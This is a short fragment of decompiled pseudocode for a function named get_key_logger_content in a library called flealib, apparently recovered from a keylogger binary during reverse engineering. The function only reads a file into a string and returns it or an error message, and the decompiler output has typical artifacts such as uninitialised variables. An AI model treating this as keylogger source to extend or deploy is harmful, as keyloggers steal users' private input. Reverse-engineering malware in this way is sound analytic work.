
  fn flealib::keylogger::get_key_logger_content::h78384b0237ee3f63(arg1: *mut i128, arg2: *mut c_void) -> *mut i128

{
    let mut var_20: i64;
    let rdx: i64 = std::fs::read_to_string::h9e8e764235d1f42f(&var_20, arg2);
    
    if !(0 + -(var_20))
    {
        let var_10: i64;
        arg1[1] = var_10;
        *arg1 = var_20;
        return arg1;
    }
    
    let var_18: i64;
    let mut var_28: i64 = var_18;
    _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h00281d94234d25d8(arg1, 
        &var_28, rdx);
    core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h96b79424257da29d(&var_28);
    arg1
}
